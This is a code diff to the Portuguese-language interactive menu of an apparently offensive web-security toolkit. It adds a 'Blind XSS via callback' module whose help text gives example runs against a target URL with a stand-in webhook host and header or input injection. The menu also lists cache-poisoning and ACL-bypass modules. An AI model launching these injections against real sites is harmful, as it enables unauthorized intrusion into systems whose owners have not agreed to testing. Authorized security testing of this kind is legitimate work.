@@ -20,6 +20,7 @@ from mytools.osint import darkwebmonitor, emailbreachcheck, googledorking, ipasn
 from mytools.vcs import vcsleak
 from mytools.web import (
     attackaudit,
+    blindxss,
     bominjection,
     cachepoisoning,
     cachedeception,
@@ -183,9 +184,10 @@ def menu() -> None:
     print(f"  {color('56', Cyber.GREEN, Cyber.BOLD)} {color('Cache Dec', Cyber.CYAN)}   Web Cache Deception (extensions)")
     print(f"  {color('57', Cyber.GREEN, Cyber.BOLD)} {color('Method Override', Cyber.CYAN)} HTTP Method Override (bypass ACL)")
     print(f"  {color('58', Cyber.GREEN, Cyber.BOLD)} {color('HPP', Cyber.CYAN)}              HTTP Parameter Pollution")
-    print(f"  {color('59', Cyber.GREEN, Cyber.BOLD)} {color('ReconAll', Cyber.CYAN)}          Todos os modulos contra um alvo")
-    print(f"  {color('60', Cyber.GREEN, Cyber.BOLD)} {color('Ajuda', Cyber.CYAN)}            exemplos rapidos")
-    print(f"  {color('61', Cyber.GREEN, Cyber.BOLD)} {color('Limpar', Cyber.CYAN)}           limpar terminal")
+    print(f"  {color('59', Cyber.GREEN, Cyber.BOLD)} {color('Blind XSS', Cyber.CYAN)}       Blind XSS via callback")
+    print(f"  {color('60', Cyber.GREEN, Cyber.BOLD)} {color('ReconAll', Cyber.CYAN)}          Todos os modulos contra um alvo")
+    print(f"  {color('61', Cyber.GREEN, Cyber.BOLD)} {color('Ajuda', Cyber.CYAN)}            exemplos rapidos")
+    print(f"  {color('62', Cyber.GREEN, Cyber.BOLD)} {color('Limpar', Cyber.CYAN)}           limpar terminal")
     print(f"  {color('0', Cyber.RED, Cyber.BOLD)} {color('Sair', Cyber.CYAN)}")
 
 
@@ -1531,6 +1533,28 @@ def launch_hpp() -> None:
     )
 
 
+def launch_blindxss() -> None:
+    """Inicia o módulo Blind XSS via callback em modo interativo."""
+    parser = blindxss.build_parser()
+    run_interactive_shell(
+        parser, "blindxss> ", blindxss.run_once,
+        description="Blind XSS via callback — injeta payloads que disparam webhook.",
+        example="https://target.com --webhook https://hook.example.com",
+        banner_fn=lambda: print(color(
+            "Blind XSS via callback — injeta payloads que disparam webhook",
+            Cyber.RED, Cyber.BOLD,
+        )),
+        contextual_help=(
+            "Uso: <url> --webhook <url> [opcoes]\n"
+            "Exemplos:\n"
+            "  https://target.com --webhook https://hook.example.com\n"
+            "  https://target.com --webhook https://hook.example.com -c input\n"
+            "  https://target.com --webhook https://hook.example.com -c header\n"
+            "  https://target.com --webhook https://hook.example.com --proxy http://127.0.0.1:8080"
+        ),
+    )
+
+
 def main() -> int:
     """Loop principal do menu interativo. Retorna 0 ao sair."""
     if "--version" in sys.argv or "-V" in sys.argv:
@@ -1665,12 +1689,14 @@ def main() -> int:
                 launch_methodoverride()
             case "58" | "hpp" | "parampollution" | "httpparampollution":
                 launch_hpp()
-            case "59" | "reconall" | "all" | "full":
+            case "59" | "blindxss" | "blindexss" | "blindxss":
+                launch_blindxss()
+            case "60" | "reconall" | "all" | "full":
                 launch_reconall()
-            case "60" | "help" | "ajuda" | "h":
+            case "61" | "help" | "ajuda" | "h":
                 help_screen()
                 input(color("Enter para voltar...", Cyber.GRAY))
-            case "61" | "clear" | "limpar" | "cls":
+            case "62" | "clear" | "limpar" | "cls":
                 clear_console()
                 continue
             case _:
